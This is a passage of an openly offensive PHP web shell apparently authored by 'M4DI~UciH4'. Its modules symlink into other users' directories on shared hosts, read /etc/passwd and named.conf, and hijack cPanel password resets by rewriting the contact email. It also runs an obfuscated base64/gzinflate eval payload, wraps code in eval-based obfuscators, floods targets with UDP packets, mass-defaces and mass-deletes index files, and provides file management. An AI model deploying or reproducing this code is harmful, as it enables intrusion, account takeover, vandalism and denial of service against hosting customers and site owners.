				$read_named_conf = @file('/etc/named.conf');
				if (!$read_named_conf) {
					echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
				} else {
					echo "<br><br><div class='tmp'><table border='1' bordercolor='lime' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
					foreach ($read_named_conf as $subject) {
						if (eregi('zone', $subject)) {
							preg_match_all('#zone "(.*)"#', $subject, $string);
							flush();
							if (strlen(trim($string[1][0])) > 2) {
								$UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
								$name = $UID['name'];
								@symlink('/', 'sym/root');
								$name   = $string[1][0];
								$iran   = '.ir';
								$israel = '.il';
								$indo   = '.id';
								$sg12   = '.sg';
								$edu    = '.edu';
								$gov    = '.gov';
								$gose   = '.go';
								$gober  = '.gob';
								$mil1   = '.mil';
								$mil2   = '.mi';
								$malay	= '.my';
								$china	= '.cn';
								$japan	= '.jp';
								$austr	= '.au';
								$porn	= '.xxx';
								$as		= '.uk';
								$calfn	= '.ca';

								if (
									eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0])
									or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])
									or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0])
									or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])
								) {
									$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
								}
								echo "
			<tr>

			<td>
			<div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
			</td>

			<td>
			' . $UID['name'] . "
			</td>

			<td>
			<a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
			</td>

			</tr></div> ";
								flush();
							}
						}
					}
				}

				echo "</center></table>";
				}
if($_GET['do'] == 'cmd') {
	echo'<center> 
	<h1>Cpanel Reset Password</h1> 
	</center><center>
	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="Your Email" /> 	 <input type="submit" name="submit" value="Crack"/></center> 	 
	</form> 	 	 
	<br/><br/><br/> 
	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<center><h1>Gak Bisa Di Akses Goblok!!!</center></h1>
	<br><br> 
	</pre>
	</center>"; } else { echo "<center>Salin Username Nya<br><br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Klik Disini</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
	}
elseif($_GET['to'] == 'sym') {
echo '<hr>';
eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6H1yOT7ZHaSRBrReKUrjCt0lakAtskqCLHPmOPi8+6u2BSyv++d+fYpE4AlVbaJhWJyHnf/b583ksnnjMGPkglJoLmLAip3ZkcH77/4/D9mXVw9Ob098N3J5P3R0cn1ocuENKFTh6oxBm2W52oNwvSTKL6fpwyahOPqtDLghmN3JBnMdFSW1uJUmhWtltpbFc6zk27tT+7jFJhk4iGwWIiFzPS7b148UIr7YdJg2Wo9JqGNmEZPJfggeBcGXpHe9/BMKyjXKUcI3qbRSgr4RfOGC+OF7Pf0uwSIzhIBQ0VFwsjAMa8m6hZu/U6ik4WOQVFr5WHeUgzcPMkB8P5NcgiRkWT2W4dByqV8QJeZwvLBJLrMGKe08y20HAQ4otLq2sVVhloYfiFSBXmGaW7ZezOcD8OGZclUYvSMOFA2q2RCqaMQsDSi8wPaaYwjCkXERX+DlZtwahvFWmkkr2fej8MS87zkDMu9rZe/tzDv6E11maE+Yw+szQexTxTYMR9ls4oyPQj9QfjYxfecXfkafZ45KnoS5QPuCnxE7VPJRVP1cVCMyx0Q9vDdyemX0M+Rz0f+vgt5oIGYVJ3JAQSls+6ObFXqaAXqU0+8oySbsVybnIkT2aBCpNJwJhtbWkBILb7o0O2rG5lRD+UidDljNlcJrZ+QsM4bAwbRIl0ZldCZ/0PZ70PjgNjGGj/nTnmAUPNuUyvJxdU5cU8jWwzaLzIqFhO2xUmJpBUesRtmqq7CIvfyB8mpszhMnEEXKjS46LCPelnNEZqAImgsY9jne95XlEUbtO3S7yqRiyQ0lfXarwuU3sJVjxpOf3qZ5bGEcuI1bzKtdXRsOXV6OBpKPASPqPemrqXz6csDSc45cwCFQjMpW9NpizILq21KJsdtAxt2UOwWshlvra3h7e3t3WqPTOvpt9uKZNUl/Lk8PjELyHSMkXL0V0RWWU7gG0EnoSI/3VAhMcQER6AROQ2UREqWIQHcLE/LtEO7sEN0/M7GzHuEZUN2PSYk3VEqvEIPgckMO9dJ4usdApuXSKIA1wAvU6VTU4z8/aKg5YFrfjMVB6KRLfZs5hyXLaa7ujGgo7e0jG2vlxSjUODYlSzAiGChV1SdUB3IIcte+4huL1yzvfOPU9qhJPdWrdpaPWQIOVEdvFqqCRw9o3GHQrWhhD5+gP49AnWGL4PPc24c+MDmaYZWSPqlP3V73uxXOddBcJj6dTL7mMGIi80aTP3gucJFes8uTEQYy+arTPmEk0hNN0TQ6zyzW+VbWJoDcTfzQxzhxEHk423mEqzOb0bID0gDzXuho3wYLevwLzWq0KpFMmq50cMVBj/AMQ3XKwi/BrA1wMY3DN9Gr9rlKkmownmJZTr+5VLeIYJ/jPNIl5I4tzci9mbEFtfsGt4fYfW6PkLAbvXe/kNoLrd+mqwfgCpq0Ing2WZrcsBYzs70aAuDxxTcUXFyEsG428C7m8P/lVgV3SWY6IIGXbwQOvjY888DTTW65schfAAtZfskQ+GW37d3nbgpoPXnv5h1bj/jMASQfFwQJJTOnN9+JunWLY9q2vILjnPsHGrSlijqfDG1rAKrTw+9ZdlA+4i0URllo+iUrk4jgjeRblY4nxeLY/d7lJRk1dGZxdNray0ap9tsvpV+2x9mX2bTfZ9jX1fY//nNdYYxw2bbORF6RV+LoMmw3mmza5MplG6Bb3v4E59EwK+CbKM4yvjz2hFoYmHtQdtrvx/Nf4H')));
}
elseif($_GET['to'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("rn", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("//var/www/(.*?)//", $dir, $vh);
		$urls = explode("rn", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}
elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
	}
	elseif(isset($_GET['do']) && ($_GET['do'] == 'ubf2'))
	{	
?>
	<div class="heading">
		<font><center><h1>Obfuscator By M4DI~UciH4 V.2</h1></center></font>
		</div>
		<div class="input">
			<form action="" method="POST">
				<textarea rows="9" cols="85" type="text" name="php" placeholder="Input Php Code Here"></textarea><br><br>
				<select name="option">
					<option>Weak Obfuscation</option>
					<option>Medium Level Obfuscation</option>
					<option>Strong Obfuscation</option>
					<option>High Level Obfuscation</option>
				</select><br><br><br>
				<input type="submit" name="submit" value="Submit" /><br>
				<?php
					if (isset($_POST['submit'])) {
					$phpcode = $_POST['php'];
						if (!empty($phpcode)) {
							$option = htmlspecialchars($_POST['option']);
							$website = "http://".$_SERVER['HTTP_HOST'];
							$file_location = $_SERVER['REQUEST_URI'];
							$all_in_one = $website.$file_location;
							$uuencode = base64_encode(convert_uuencode($phpcode));
							$obfuscate_low_level = strrev(base64_encode(gzdeflate(gzcompress($phpcode))));
							$obfuscate_medium_level = strrev(base64_encode(gzdeflate(gzdeflate(gzcompress($phpcode)))));
							$obfuscate_high_level = strrev(base64_encode(gzdeflate(gzdeflate(gzdeflate(gzcompress(gzcompress($phpcode)))))));
							$high_level = strrev(base64_encode(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(str_rot13($phpcode)))))))))));
							$high_level_1 = str_replace('a', '\x61', $high_level);
							$high_level_2 = str_replace('A', '\x41', $high_level_1);
							$high_level_3 = str_replace('b', '\x62', $high_level_2);
							$high_level_4 = str_replace('B', '\x42', $high_level_3);
							$high_level_5 = str_replace('c', '\x63', $high_level_4);
							$high_level_6 = str_replace('C', '\x43', $high_level_5);
							$high_level_7 = str_replace('=', '\x3d', $high_level_6);
							$high_level_8 = str_replace('+', '\x2b', $high_level_7);
							switch ($option) {	
								case 'Weak Obfuscation':
									echo '
<textarea rows="9" cols="85">
<?php
$UeXploiT = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUHHMM8iLN64IyMnPDEkN0gQ\x42\x61w\x41\x3d";
$An0n_3xPloiTeR = "'.$obfuscate_low_level.'";
eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
exit;
?></textarea><br><br>
';
								break;

								case 'Medium Level Obfuscation':
									echo '<textarea rows="9" cols="85">
<?php
$UeXploiT = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLElFYiUlFqe\x61m\x63Snp\x43\x62np6RqFJ\x63UF\x61WW\x61\x61g45hnkxRtX\x42OTkZ4\x61k\x42mm\x43gTU\x41";
$An0n_3xPloiTeR = "'.$obfuscate_medium_level.'";
eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
exit;
?></textarea><br><br>
';

								break;

								case 'Strong Obfuscation':
									echo '<textarea rows="9" cols="85">
<?php
$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGiqOeQZ58\x63YV\x41Tn5mSGpQZpQY\x410\x41";
$An0n_3xPloiTeR = "'.$obfuscate_high_level.'";
eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
exit;
?></textarea><br><br>
';
								break;

								case 'High Level Obfuscation':
									echo '<textarea rows="9" cols="85">
<?php
$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
$An0n_3xPloiTeR = "'.$high_level_8.'";
eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
exit;
?></textarea><br><br>
';
								break;
                                            }
                                        }
                                    }
                                    ?>
			</form>
		</div>
		<div class="footer">
			<footer>
				<font><center>Developed By<a href="https://www.google.com/search?q=M4DI~UciH4" target="_blank"> M4DI~UciH4</a></center></font>
			</footer>
		</div>
	</body>
</html>
<?php
} elseif(isset($_GET['do']) && ($_GET['do'] == 'ubf'))
{	
?>
<div class="heading">
		<font><center><h1>Obfuscator By M4DI~UciH4</h1></center></font>
		</div>
		<div class="input">
			<form action="" method="POST">
				<textarea rows="9" cols="85" type="text" name="php" placeholder="Input Php Code Here"></textarea><br><br>
				<select name="option">
					<option>Weak Obfuscation</option>
					<option>Medium Level Obfuscation</option>
					<option>Strong Obfuscation</option>
				</select><br><br><br>
				<center><input type="submit" name="submit" value="Submit" /></center><br>
				<?php 

                                    if (isset($_POST['submit'])) {
                                        $phpcode = $_POST['php'];
                                        if (!empty($phpcode)) {
                                            $option = htmlspecialchars($_POST['option']);
                                            $website = "http://" . $_SERVER['HTTP_HOST'];
                                            $file_location = htmlspecialchars($_SERVER['REQUEST_URI']);
                                            $all_in_one = $website . $file_location;
                                            $final = strrev(base64_encode(gzdeflate(gzcompress($phpcode))));
                                            $obfuscated_code = $final;
                                            switch ($option) {
                                                case 'Weak Obfuscation':
                                                    echo '
<textarea rows="9" cols="85">
<?php
/*
The Given Code Was Successfully Obfuscated By M4DI~UciH4
*/
$Cyber = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUzQg==";
$Crime = "' . $obfuscated_code . '";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?></textarea>
';
                                                    break;
                                                case 'Medium Level Obfuscation':
                                                    $obfuscate_medium_level = strrev(base64_encode(gzdeflate(gzdeflate(gzcompress($phpcode)))));
                                                    echo '<textarea rows="9" cols="85">
<?php
/*
The Given Code Was Successfully Obfuscated By M4DI~UciH4
*/
$Cyber = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
$Crime = "' . $obfuscate_medium_level . '";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?></textarea>
';
                                                    break;
                                                case 'Strong Obfuscation':
                                                    $obfuscate_high_level = strrev(base64_encode(gzdeflate(gzdeflate(gzdeflate(gzcompress(gzcompress($phpcode)))))));
                                                    echo '<textarea rows="9" cols="85">
<?php
/*
The Given Code Was Successfully Obfuscated By M4DI~UciH4
*/
$Cyber = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
$Crime = "' . $obfuscate_high_level . '";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?></textarea>
';
                                                    break;
                                            }
                                        }
                                    }
                                    ?>
			</form>
		</div>
		<div class="footer">
			<footer>
				<font><center>Developed By<a href="https://www.google.com/search?q=M4DI~UciH4" target="_blank"> M4DI~UciH4</a></center></font>
			</footer>
		</div>
	</body>
</html>
<?php
$submit = $_POST['fire'];
if (isset($submit)) {

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s n";
}
}
if($_GET['do'] == 'kill') {
   ?>
   <tr>
   <td>
   <center>
<img src="https://s8.gifyu.com/images/tenor606e3eba446f06c1.gif" width="200" height="200">
   <p>Are You Sure Want To Kill Me?<a href='?dir=$dir&kill=self' class="tombol"><font color="red">Klik Untuk Hapus</a><font color="white"> or<a href='?'> no</a></font>
<embed src="<?=$end;?>" autostart="TRUE" loop="TRUE" width="0" height="0"></embed>

   </center>
   </td>
   </tr>
   <?php
   }
elseif($_GET['kill'] == 'self') {
    if(@unlink(preg_replace('!(d+)s.*!', '', __FILE__)))
            die('<center><br><center><h2>Shell removed!!!</h2><br>Goodbye M4DI~UciH4</center></center>');
        else
            echo '<center>unlink failed!</center>';
}
elseif($_GET['do'] == 'masse') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=dodgerlime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=dodgerlime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px; background-color: black; color:white;'>Hacked By M4DI~UciH4</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
}
elseif($_GET['do'] == 'new'){
echo "<div id='menu'><center>";
echo "</br><a href='?path=$path&opt=newfile'>New File</a></br><a href='?path=$path&opt=newfolder'>New Folder</a></div>";
}
elseif($_GET['opt'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$opt = "<script>window.location='?act=edit&dir=".$path."&file=".$_POST['newfile']."';</script>";
		} else {
			$opt = "<font color=red>permission denied</font>";
		}
	}
	echo $opt;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$path/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['opt'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$opt = "<font color=red>permission denied</font>";
		} else {
			$opt = "<script>window.location='?dir=".$path."';</script>";
		}
	}
	echo $opt;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
}
elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=dodgerlime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
}
echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" 
 align="center" style="background-image: url(https://cdn.wallpapersafari.com/48/41/SEYUFk.gif); background-repeat: no-repeat; background-attachment: fixed; background-size: 100%  100%;">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Type</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Modified</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Action</peller></center></td>
</tr>';

$scandir = scandir($path);
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
$dtype = filetype("$path/$dir");
$dtime = date("F d Y g:i:s", filemtime("$path/$dir"));
echo '<tr>
<td><img src="https://i.top4top.io/p_17236igei0.png" width="15" height="15"><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>';
echo '<td><center>'.$dtype.'</center></td>';
echo '<td><center>--</center></td>';
echo '<td><center>'.$dtime.'</center></td>';
echo '<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" class="inputz">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" class="inputz" value=">>">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$ftype = filetype("$path/$file");
$ftime = date("F d Y g:i:s", filemtime("$path/$file"));
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><img src="https://l.top4top.io/p_17236vww40.png" width="15" height="15"><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>';
echo '<td><center>'.$ftype.'</center></td>';
echo '<td><center>'.$size.'</center></td>';
echo '<td><center>'.$ftime.'</center></td>';
echo '<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td><td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" class="inputz">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" class="inputz" value=">>">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/>M4DI~UciH4</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
